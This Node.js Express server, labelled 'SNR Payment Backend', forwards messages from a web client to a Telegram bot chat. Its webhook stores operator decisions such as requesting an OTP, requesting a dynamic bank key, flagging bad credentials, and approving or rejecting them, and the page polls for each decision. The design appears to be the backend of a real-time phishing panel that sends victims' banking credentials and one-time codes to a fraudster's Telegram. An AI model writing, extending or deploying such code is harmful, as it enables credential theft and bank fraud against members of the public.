import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('❌ Error: Variables de entorno no configuradas');
  console.error('   Agrega TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID a .env');
  process.exit(1);
}

app.use(cors());
app.use(express.json());

// ============================================
// ALMACENAMIENTO EN MEMORIA (estado de pagos)
// ============================================
const estadoPagos = new Map();

// Limpiar estados después de 10 minutos
setInterval(() => {
  const ahora = Date.now();
  for (const [key, value] of estadoPagos.entries()) {
    if (ahora - value.timestamp > 10 * 60 * 1000) {
      estadoPagos.delete(key);
      console.log(`🗑️  Limpiado estado: ${key}`);
    }
  }
}, 60 * 1000);

// ============================================
// SERVIR ARCHIVOS ESTÁTICOS
// ============================================
app.use(express.static('.'));

// ============================================
// ENVIAR MENSAJE A TELEGRAM
// ============================================
app.post('/api/send-telegram', async (req, res) => {
  try {
    const { mensaje, inline_keyboard } = req.body;

    if (!mensaje) {
      res.status(400).json({ error: 'Mensaje es requerido' });
      return;
    }

    console.log('📨 Enviando a Telegram:', mensaje.substring(0, 100) + '...');

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: 'Markdown',
        reply_markup: inline_keyboard,
        disable_web_page_preview: true
      })
    });

    const data = await response.json();

    if (data.ok) {
      console.log('✅ Mensaje enviado a Telegram');
      res.json({ ok: true, message_id: data.result.message_id });
    } else {
      console.error('❌ Error Telegram:', data.description);
      res.status(400).json({ ok: false, error: data.description });
    }
  } catch (error) {
    console.error('❌ Error enviando a Telegram:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// ============================================
// WEBHOOK DE TELEGRAM
// ============================================
app.post('/api/webhook', (req, res) => {
  const update = req.body;

  console.log('📨 Update recibido de Telegram:', JSON.stringify(update, null, 2));

  // Si es un callback_query (botón presionado)
  if (update.callback_query) {
    const callbackData = update.callback_query.data;
    const chatId = update.callback_query.from.id;
    const messageId = update.callback_query.message.message_id;

    console.log('🔘 Callback data:', callbackData);
    console.log('👤 Chat ID:', chatId);

    // Procesar callbacks
    if (callbackData.startsWith('approve_')) {
      const solicitudId = callbackData.replace('approve_', '');
      console.log('✅ APROBADO:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'approved',
        timestamp: Date.now(),
        chatId: chatId
      });

      console.log(`✅ Estado guardado para ${solicitudId}: APPROVED`);

    } else if (callbackData.startsWith('reject_')) {
      const solicitudId = callbackData.replace('reject_', '');
      console.log('❌ RECHAZADO:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'rejected',
        timestamp: Date.now(),
        chatId: chatId
      });

      console.log(`❌ Estado guardado para ${solicitudId}: REJECTED`);

    } else if (callbackData.startsWith('pedir_otp_')) {
      const solicitudId = callbackData.replace('pedir_otp_', '');
      console.log('📱 OTP solicitado:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'pedir_otp',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('pedir_clave_din_')) {
      const solicitudId = callbackData.replace('pedir_clave_din_', '');
      console.log('🔑 Clave dinámica solicitada:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'pedir_clave_din',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('error_credenciales_')) {
      const solicitudId = callbackData.replace('error_credenciales_', '');
      console.log('❌ Error en credenciales:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'error_credenciales',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('aprobar_otp_')) {
      const solicitudId = callbackData.replace('aprobar_otp_', '');
      console.log('✅ OTP Aprobado:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'aprobar_otp',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('rechazar_otp_')) {
      const solicitudId = callbackData.replace('rechazar_otp_', '');
      console.log('❌ OTP Rechazado:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'rechazar_otp',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('aprobar_clave_din_')) {
      const solicitudId = callbackData.replace('aprobar_clave_din_', '');
      console.log('✅ Clave Dinámica Aprobada:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'aprobar_clave_din',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('rechazar_clave_din_')) {
      const solicitudId = callbackData.replace('rechazar_clave_din_', '');
      console.log('❌ Clave Dinámica Rechazada:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'rechazar_clave_din',
        timestamp: Date.now(),
        chatId: chatId
      });
    }
  }

  // Responder a Telegram
  res.json({ ok: true });
});

// ============================================
// POLLING - VERIFICAR ESTADO
// ============================================
app.get('/api/webhook', (req, res) => {
  const check = req.query.check;
  const setup = req.query.setup;

  if (setup) {
    // Setup request
    console.log('🔗 Webhook setup request');
    res.json({ success: true, message: 'Webhook ready' });
    return;
  }

  if (!check) {
    res.status(400).json({ error: 'Missing check parameter' });
    return;
  }

  const estado = estadoPagos.get(check);

  if (!estado) {
    console.log(`🔍 Verificando ${check}: pending`);
    res.json({ estado: 'pending', solicitudId: check });
    return;
  }

  console.log(`🔍 Verificando ${check}: ${estado.estado}`);
  res.json({
    estado: estado.estado,
    solicitudId: check,
    timestamp: estado.timestamp
  });
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ============================================
// LISTAR ESTADOS (DEBUG)
// ============================================
app.get('/api/debug/estados', (req, res) => {
  const estados = {};
  for (const [key, value] of estadoPagos.entries()) {
    estados[key] = value.estado;
  }
  res.json({ total: estadoPagos.size, estados });
});

// ============================================
// CONFIGURAR WEBHOOK EN TELEGRAM (AUTOMÁTICO)
// ============================================
async function configurarWebhookTelegram() {
  const WEBHOOK_URL = process.env.WEBHOOK_URL || `http://localhost:${PORT}/api/webhook`;

  try {
    console.log('🔗 Configurando webhook en Telegram...');
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: WEBHOOK_URL,
        drop_pending_updates: true
      })
    });

    const data = await response.json();
    if (data.ok) {
      console.log(`✅ Webhook configurado en: ${WEBHOOK_URL}`);
    } else {
      console.error('❌ Error configurando webhook:', data.description);
    }
  } catch (error) {
    console.error('❌ Error en webhook setup:', error.message);
  }
}

// ============================================
// INICIAR SERVIDOR
// ============================================
app.listen(PORT, async () => {
  console.log(`
╔════════════════════════════════════════╗
║  🚀 SNR Payment Backend                ║
║  Puerto: ${PORT}                          ║
║  Webhook: /api/webhook                 ║
║  Status: /health                       ║
║  Debug: /api/debug/estados              ║
╚════════════════════════════════════════╝
  `);

  // Configurar webhook automáticamente
  await configurarWebhookTelegram();
});

process.on('SIGINT', () => {
  console.log('\n📴 Servidor detenido');
  process.exit(0);
});
